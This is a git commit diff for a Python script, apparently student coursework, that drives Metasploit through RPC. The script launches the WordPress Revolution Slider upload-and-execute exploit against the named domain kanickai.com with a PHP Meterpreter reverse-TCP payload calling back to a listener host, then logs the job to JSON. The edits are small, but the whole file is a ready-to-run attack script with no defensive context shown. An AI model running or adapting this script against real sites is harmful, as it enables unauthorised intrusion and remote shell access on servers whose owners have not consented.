feff69cfa2be5f5c6b2ab3b762d94f4a066e6a66
NEXTGENTIGER <johnfildanpaththinathan@supdevinci-edu.fr>
2025-06-08 15:17:52 +0200

    Update run_msf_json.py

--- Metasploit/run_msf_json.py
+++ Metasploit/run_msf_json.py
@@ -1,20 +1,20 @@
 from pymetasploit3.msfrpc import MsfRpcClient
 import json
 import datetime
+import os
 
-# Connexion RPC (user/pass = msf/test)
+# Connexion RPC
 client = MsfRpcClient(password='test', port=55553, ssl=False)
 
 exploit = client.modules.use('exploit', 'unix/webapp/wp_revslider_upload_execute')
 exploit['RHOSTS'] = 'kanickai.com'
 exploit['TARGETURI'] = '/wordpress'
-exploit['LHOST'] = '192.168.1.100'
+exploit['LHOST'] = '192.168.1.100'  # Remplace par ton IP
 exploit['LPORT'] = 4444
 exploit['PAYLOAD'] = 'php/meterpreter/reverse_tcp'
 
 job_id = exploit.execute()
 
-# Récupérer le statut
 results = {
     "exploit": exploit.name,
     "target": exploit['RHOSTS'],
@@ -22,9 +22,10 @@ results = {
     "job_id": job_id
 }
 
-# Enregistrer sous JSON
 timestamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
-with open(f"/msf/results/metasploit_result_{timestamp}.json", "w") as f:
+filename = f"/msf/results/metasploit_result_{timestamp}.json"
+
+with open(filename, "w") as f:
     json.dump(results, f, indent=2)
 
-print(f"✅ Résultat enregistré dans results/metasploit_result_{timestamp}.json")
+print(f"✅ Résultat enregistré dans : {filename}")
